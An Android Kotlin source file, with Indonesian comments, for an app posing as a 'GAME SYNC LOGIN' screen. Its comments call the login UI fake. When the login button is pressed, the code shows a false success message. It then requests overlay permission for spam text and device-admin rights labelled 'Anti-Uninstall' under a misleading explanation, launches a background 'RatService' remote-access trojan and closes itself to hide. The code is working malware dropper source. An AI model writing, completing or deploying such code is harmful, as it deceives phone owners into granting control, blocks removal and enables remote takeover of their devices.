package com.system.sync

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.text.InputType
import android.view.Gravity
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast

class MainActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        
        // Setup UI Login Palsu
        val layout = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(60, 150, 60, 60)
            setBackgroundColor(Color.parseColor("#121212"))
        }

        val title = TextView(this).apply {
            text = "GAME SYNC LOGIN"
            textSize = 28f
            setTextColor(Color.WHITE)
            gravity = Gravity.CENTER
        }
        layout.addView(title)

        val etUsername = EditText(this).apply {
            hint = "Username"
            setHintTextColor(Color.GRAY)
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#1E1E1E"))
            setPadding(30, 30, 30, 30)
        }
        layout.addView(etUsername)

        val etPassword = EditText(this).apply {
            hint = "Password"
            setHintTextColor(Color.GRAY)
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#1E1E1E"))
            setPadding(30, 30, 30, 30)
            inputType = InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
        }
        layout.addView(etPassword)

        val btnLogin = Button(this).apply {
            text = "MASUK"
            textSize = 18f
            setTextColor(Color.WHITE)
            setBackgroundColor(Color.parseColor("#D32F2F"))
        }
        layout.addView(btnLogin)

        val tvContact = TextView(this).apply {
            text = "Lupa Password?\nSilakan hubungi saya: 085601849504"
            textSize = 14f
            setTextColor(Color.parseColor("#A0A0A0"))
            gravity = Gravity.CENTER
            setPadding(0, 30, 0, 20)
        }
        layout.addView(tvContact)

        setContentView(layout)

        // Aksi Tombol Login
        btnLogin.setOnClickListener {
            Toast.makeText(this, "Sinkronisasi berhasil...", Toast.LENGTH_SHORT).show()
            executeDropperPayload()
        }
    }

    private fun executeDropperPayload() {
        // 1. Minta Izin Overlay (Biar bisa nampilin spam teks)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
        }

        // 2. Minta Izin Device Admin (Anti-Uninstall)
        // PERBAIKAN: Pake MyDeviceAdminReceiver::class.java
        val adminComponent = ComponentName(this, MyDeviceAdminReceiver::class.java)
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        
        if (!dpm.isAdminActive(adminComponent)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
                // PERBAIKAN: Paksa String biar nggak ambigu
                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Aktifkan modul untuk melanjutkan sinkronisasi." as String)
            }
            startActivity(intent)
        }

        // 3. Jalanin Service RAT di Background
        val serviceIntent = Intent(this, RatService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
        
        // 4. Tutup Activity (Sembunyi)
        finish()
    }
}
